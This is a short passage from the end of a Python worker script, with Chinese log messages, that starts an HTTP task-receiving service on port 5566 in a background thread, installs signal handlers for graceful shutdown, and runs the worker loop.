            logger.error("HTTP 接收服务启动失败: %s", exc)

    Thread(target=_run_http, daemon=True).start()
    logger.info("任务接收服务已启动: 0.0.0.0:5566")

    def _stop(signum, frame):
        worker.stop_event.set()
        logger.info("收到信号，Worker 停止")
        sys.exit(0)
    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)
    worker.run()


if __name__ == "__main__":
    main()
